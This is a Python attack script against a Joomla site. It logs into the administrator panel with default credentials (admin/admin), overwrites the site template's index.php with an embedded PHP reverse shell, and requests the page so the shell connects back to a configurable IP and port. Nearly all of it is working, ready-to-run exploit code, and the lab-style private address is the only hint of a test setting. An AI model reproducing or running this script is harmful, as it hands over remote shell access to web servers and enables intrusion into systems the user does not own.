#!/usr/bin/env python3
# Author : @trustie_rity

import requests
import re

# reverse shell

shell = """
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
"""


# Function to get login page and get return value
def get_return(session, url):
    response = session.get(url)
    return_match = re.search(r"name=\"return\" value=\"(.*?)\"", response.text)
    print(return_match)
    if return_match:
        print(return_match.group(1))
        return return_match.group(1)
    else:
        raise Exception("Return Value not found")

# Function to get security token
def get_token(session, url):
    response = session.get(url)
    token_match = re.search(r"name=\"(.*?)\" value=\"1\"", response.text)
    print(token_match)
    if token_match:
        print(token_match.group(1))
        return token_match.group(1)

# Function to log in and store session
def login():
    session = requests.Session()
    
    # Get return value
    return_value = get_return(session, "http://192.168.125.10:8080/administrator/")
    
    # Get token value
    token = get_token(session, "http://192.168.125.10:8080/administrator/")

    # Login URL and credentials
    login_url = 'http://192.168.125.10:8080/administrator/index.php'
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://192.168.125.10:8080',
        'Connection': 'keep-alive',
        'Referer': 'http://192.168.125.10:8080/administrator/',
        'Upgrade-Insecure-Requests': '1',
    }
    
    data = {
        'username': 'admin',    # change this with the actual password
        'passwd': 'admin',  # change this with the actual password
        'option': 'com_login',
        'task': 'login',
        'return': return_value,
        token: '1',
    }

    # Perform login request
    response = session.post(login_url, headers=headers, data=data)
    if response.status_code == 200 and "Logout" in response.text:
        print("Login successful.")
        return session
    else:
        print("Login failed.")
        return None

# Function to edit a Joomla template
def edit_template(session):
    if not session:
        print("Invalid session. Cannot proceed.")
        return
    
    # Getting token
    token = get_token(session, "http://192.168.125.10:8080/administrator/index.php?option=com_templates&view=template&id=503&file=L2luZGV4LnBocA")

    # Template editing URL
    template_url = 'http://192.168.125.10:8080/administrator/index.php'

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://192.168.125.10:8080',
        'Connection': 'keep-alive',
        'Referer': 'http://192.168.125.10:8080/administrator/index.php?option=com_templates&view=template&id=503&file=L2luZGV4LnBocA%3D%3D',
        'Upgrade-Insecure-Requests': '1',
    }

    params = {
        'option': 'com_templates',
        'view': 'template',
        'id': '503',
        'file': 'L2luZGV4LnBocA',
    }

    global shell

    data = {
        'jform[source]': shell,
        'task': 'template.apply',
         token: '1',
        'jform[extension_id]': '503',
        'jform[filename]': '/index.php',
    }

    # Perform template editing request using the session
    response = session.post(template_url, headers=headers, params=params, data=data)
    print(response.cookies)
    print(response.headers)

    if response.status_code == 200 and "File successfully saved" in response.text:
        print("Template edited successfully.")
    else:
        print(f"Failed to edit template. Status code: {response.status_code}")

# Function to trigger the saved template file
def trigger_template(session):
    if not session:
        print("Invalid session. Cannot proceed.")
        return

    # URL to trigger the template
    trigger_url = 'http://192.168.125.10:8080/index.php'

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Referer': 'http://192.168.125.10:8080/administrator/index.php?option=com_templates&view=template&id=503&file=aG9tZQ==',
        'Upgrade-Insecure-Requests': '1',
    }

    params = {
        'tp': '1',
        'templateStyle': '4',
    }

    # Perform GET request to trigger the template
    response = session.get(trigger_url, headers=headers, params=params)

    if response.status_code == 200:
        print("Template triggered successfully.")
        print("Response content:")
        print(response.text[:500])  # Print the first 500 characters of response
    else:
        print(f"Failed to trigger template. Status code: {response.status_code}")

# Main execution
session = login()
edit_template(session)
trigger_template(session)
